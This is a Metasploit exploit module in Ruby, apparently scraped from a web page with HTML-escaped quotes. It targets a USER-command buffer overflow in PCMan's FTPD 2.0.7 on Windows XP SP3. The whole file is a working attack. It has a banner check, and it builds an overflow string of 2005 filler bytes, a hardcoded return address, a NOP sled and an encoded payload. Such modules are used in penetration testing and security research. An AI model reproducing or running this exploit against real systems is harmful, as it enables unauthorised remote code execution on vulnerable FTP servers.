 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::Ftp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;PCMan\&#039;s FTPD V2.0.7 Username Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overflow found in the USER command
                of PCMan&#039;s FTPD.
            },
            &#039;Author&#039;         => &#039;MSJ <matt.jones.85[at]gmail.com>&#039;,
            &#039;License&#039;        => MSF_LICENSE,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 2005,
                    &#039;BadChars&#039; => "\x53\x93\x42\x7E",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    # Target 0
                    [
                        &#039;Windows XP SP3 English&#039;,
                        {
                            &#039;Ret&#039;      => 0x7e429353 # push esp, ret
                        }
                    ]
                ],
            &#039;Default Target&#039; => 0))
    end
 
    def check
        connect
        disconnect
 
        if (banner =~ /220 PCMan\&#039;s FTP Server 2\.0 Ready\./)
            return Exploit::CheckCode::Vulnerable
        end
            return Exploit::CheckCode::Safe
    end
 
    def exploit
        connect
 
        print_status("Trying target #{target.name}...")
 
        sploit = &#039;USER &#039; + "\x41" * 2005 + [target.ret].pack(&#039;V&#039;) + make_nops(16) + payload.encoded
         
        send_cmd( [sploit] , false )
 
        handler
        disconnect
    end
 
end

